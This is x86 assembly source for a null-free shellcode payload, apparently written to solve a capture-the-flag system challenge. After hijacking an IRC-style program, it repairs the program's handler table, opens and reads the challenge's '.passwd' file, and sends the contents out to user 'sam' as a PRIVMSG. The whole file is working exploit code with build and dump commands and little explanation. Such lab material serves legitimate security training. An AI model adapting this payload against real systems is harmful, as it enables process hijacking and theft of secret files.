;  nasm -f elf -o out.o getpw.s
; first check for nulls:
;  objdump -d out.o
; or dump shellcode:
;  objcopy --output-target=binary --only-section=.text out.o getpw.bin

section .data
; crickets

section .text
global _start
_start:
; msg ebx
; msg.cmd ebx = "PRIVMSG"
; msg.from ebx+33 <- flag here
; msg.to ebx+98
; msg.data ebx + 163

; save ebx+33 (msg.from ptr)
mov edx, ebx
add edx, 33


; turn msg.cmd into a format string
; PRIVMSG sam :%s\r\n
add ebx, 7
mov DWORD [ebx], 0x6d617320 ; sam
add ebx, 4
mov DWORD [ebx], 0x73253a20 ; ' :%s'
add ebx, 4
mov eax, 0xaaaaa0a7 ; '\r\n\0\0' ^ 0xAA
xor eax, 0xaaaaaaaa
mov DWORD [ebx], eax


; revert Handler_List
mov ebx, 0x0804b160
; [0].cmd = "376\0"
mov eax, 0x363733AA
shr eax, 0x8
mov DWORD [ebx], eax

add ebx, 36
; [0].handler = end_list_handle
mov DWORD [ebx], 0x080488d5

add ebx, 4
; [1].cmd[0] = 'J'
mov BYTE [ebx], 0x4a

; revert n_handlers
xor eax, eax ; O_RDONLY (for open())
mov al, 4
mov ebx, 0x804b144
mov DWORD [ebx], eax


; open(".passwd", O_RDONLY = 0)
; eax=5, ebx="...", ecx=0
push 5
pop eax ; open

xor ecx, ecx ; O_RDONLY

; push '/challenge/app-systeme/ch31/.passwd\x00' backwards on the stack
; push 0x00647773 (\x00dws) but without null
mov ebx, 0x647773AA
shr ebx, 0x8
push ebx
push 0x7361702e ; .pas
push 0x2f313368 ; h31/
push 0x632f656d ; me/c
push 0x65747379 ; yste
push 0x732d7070 ; pp-s
push 0x612f6567 ; ge/a
push 0x6e656c6c ; llen
push 0x6168632f ; /cha


mov ebx, esp
int 0x80 ; syscall

; clean up stack
add esp, 36


; read(fd, buffer, 32)
; eax=3, ebx=fd, ecx=buffer, edx=32
mov ebx, eax
mov ecx, edx
push 3
pop eax ; read
push 32
pop edx
int 0x80 ; syscall

; null terminate read
mov ebx, ecx
add ebx, eax
mov BYTE [ebx], dh

; code from end_list_handle, with our strings
push ebp
mov ebp, esp

; buffer (flag)
push ecx
; msg.cmd (format string)
sub ecx, 33
push ecx
; fd
mov eax, DWORD [ebp + 0x8]
push eax

mov eax, 0x8049078 ; write_msg
call eax
leave
ret